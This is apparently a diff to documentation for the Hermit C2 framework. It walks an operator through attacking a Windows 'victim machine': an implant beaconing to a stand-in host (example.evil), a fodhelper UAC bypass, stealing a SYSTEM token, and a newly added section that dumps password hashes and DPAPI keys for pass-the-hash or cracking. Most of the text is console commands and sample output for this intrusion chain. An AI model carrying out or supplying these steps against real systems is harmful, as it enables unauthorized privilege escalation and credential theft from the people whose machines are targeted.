@@ -18,7 +18,7 @@ Hermit > listener new
 # 3. Generate an implant (beacon, windows/amd64/exe).
 Hermit > payload gen
 
-# 4. Transfer the implant to Windows victim machine and execute it.
+# 4. Transfer the implant to Windows victim machine and execute it as normal user (not administrator or system user).
 
 # Wait until the agent callbacks...
 
@@ -79,7 +79,7 @@ Success: The fodhelper.exe and another process started successfully.
 ```
 
 Okay, now the implant **'escalated'** process has started.  
-Exit the current agent mode and check another agent session:
+Exit the current agent mode and check another agent session (wait a few seconds until calback again):
 
 ```sh title="Hermit C2 Server Console"
 Hermit [agent-stephan] > exit
@@ -139,7 +139,7 @@ Sicne we have **SeImpersonatePrivilege**, we can abuse it for privilege escalati
 
 ## 4. Token Stealing
 
-We're going to steal token and impersonate logged-on as **SYSTEM** user with Token Manipulation technique.  
+We're going to steal token and retrive the **SYSTEM** user account.  
 Firstly, enumerate running proccesses and find a process which is available to our purpose so run the following command:
 
 ```sh title="Hermit C2 Server Console"
@@ -169,30 +169,49 @@ Then try stealing using this PID:
 
 ```sh title="Hermit C2 Server Console"
 # -p 792: Set the target PID 792.
-# --login: Enable impersonate logged-on.
-Hermit [agent-elizabeth] > token steal -p 792 --login
+Hermit [agent-elizabeth] > token steal -p 792
 
 # Wait until the result will be callback...
 
 Hermit [agent-elizabeth] > task results
 
-2024-05-13 10:14:32 : token steal --pid 792 --login true
+2024-05-13 10:14:32 : token steal --pid 792
 ===============================================================================
 Success: Token has been stolen successfully.
 ```
 
-If this task is succussful, we should be now **SYSTEM** user.  
-Check that with the following commands:
+If this task is succussful, another implant process will start again.  
+Exit the current agent mode and see another agent session:
 
 ```sh title="Hermit C2 Server Console"
-Hermit [agent-elizabeth] > whoami
-Hermit [agent-elizabeth] > whoami --priv
+Hermit [agent-elizabeth] > exit
+Hermit > agents
+
+[+]
+ID  Name             IP           OS/Arch        Hostname         ListenerURL                 ImplantType  CheckIn              SessionID
+1   agent-stephan    172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:53:17  Imh2EvmDAJOglBMJZjBddB1Dib5UyJt2
+2   agent-elizabeth  172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:54:12  HHqvfKw8I5Lu4bzmH6MFknjKO7YFV3lG
+3   agent-thomas     172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:55:24  xe8dBGZkkQ1TZkcxJa3EC4U5SqOE0EfC
 ```
 
-We should see that we're **SYSTEM** user and have more highly privileges enabled as follow:
+Now switch to the newly agent (**ID: 3** here) with the following command:
 
 ```sh title="Hermit C2 Server Console"
-Hermit [agent-elizabeth] > task results
+Hermit > agent use 3
+Hermit [agent-thomas] >
+```
+
+Check current username and privileges with the following commands:
+
+```sh title="Hermit C2 Server Console"
+Hermit [agent-thomas] > whoami
+Hermit [agent-thomas] > whoami --priv
+```
+
+We should see that we're currently the **SYSTEM** user and have many privileges enabled as follow:
+
+```sh title="Hermit C2 Server Console"
+Hermit [agent-thomas] > task results
 
 2024-05-13 10:14:40 : whoami
 ============================
@@ -200,30 +219,56 @@ VICTIM-MACHINE\SYSTEM
 
 2024-05-13 10:14:51 : whoami priv
 =================================
+x SeAssignPrimaryTokenPrivilege
 x SeIncreaseQuotaPrivilege
+o SeTcbPrivilege
 x SeSecurityPrivilege
 x SeTakeOwnershipPrivilege
 x SeLoadDriverPrivilege
-x SeSystemProfilePrivilege
-x SeSystemtimePrivilege
-x SeProfileSingleProcessPrivilege
-x SeIncreaseBasePriorityPrivilege
-x SeCreatePagefilePrivilege
+o SeProfileSingleProcessPrivilege
+o SeIncreaseBasePriorityPrivilege
+o SeCreatePermanentPrivilege
 x SeBackupPrivilege
 x SeRestorePrivilege
 x SeShutdownPrivilege
 o SeDebugPrivilege
+o SeAuditPrivilege
 x SeSystemEnvironmentPrivilege
 o SeChangeNotifyPrivilege
-x SeRemoteShutdownPrivilege
 x SeUndockPrivilege
 x SeManageVolumePrivilege
 o SeImpersonatePrivilege
 o SeCreateGlobalPrivilege
-x SeIncreaseWorkingSetPrivilege
-x SeTimeZonePrivilege
-x SeCreateSymbolicLinkPrivilege
-x SeDelegateSessionUserImpersonatePrivilege
+x SeTrustedCredManAccessPrivilege
 ```
 
-Of particular note is that we own **SeDebugPrivilege**. With this privilege, we can do many things on this victim machine.
+## 5. Exfiltration (Credential Dumping)
+
+Now nothing is impossible for us because we're currently the **SYSTEM** user!  
+So let's dump the credentials.  
+
+We use the `hashdump` task to dump hash passwords from registry hives.  
+To do so simply run the following command:
+
+```sh title="Hermit C2 Server Console"
+Hermit [agent-thomas] > hashdump
+```
+
+After a few seconds, get the result:
+
+```sh title="Hermit C2 Server Console"
+Hermit [agent-thomas] > task results
+
+2024-05-13 10:15:48 : hashdump
+==============================
+Administrator:500:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
+Guest:501:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
+DefaultAccount:503:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
+WDAGUtilityAccount:504:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
+Victim:1001:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
+
+dpapi_machinekey:0x0123456789abcdef0123456789abcdef01234567
+dpapi_userkey:0x0123456789abcdef0123456789abcdef01234567
+```
+
+We can use these hash passwords for **Pass the Hash** attack or we can crack them.  
